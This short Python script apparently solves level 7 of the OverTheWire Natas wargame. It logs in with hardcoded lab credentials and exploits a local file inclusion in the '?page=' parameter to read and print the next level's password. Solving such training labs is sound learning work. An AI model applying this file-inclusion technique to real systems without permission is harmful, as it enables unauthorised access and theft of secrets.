import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas7.natas.labs.overthewire.org"

def get_path_password():
    r = requests.get(url, auth=('natas7', 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'), verify=False)
    if r.status_code == 200:
        path = re.findall('natas8 is in (.+) ', r.text)[0]
    return path

def exp():
    r = requests.get(url + "?page=" + get_path_password(), auth=('natas7', 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'), verify=False)
    if r.status_code == 200:
        password = re.findall(r'<br>\s*<br>\s*(\w+)', r.text)[0]
        print("Password for natas8: " + password)

if __name__ == "__main__":
    exp()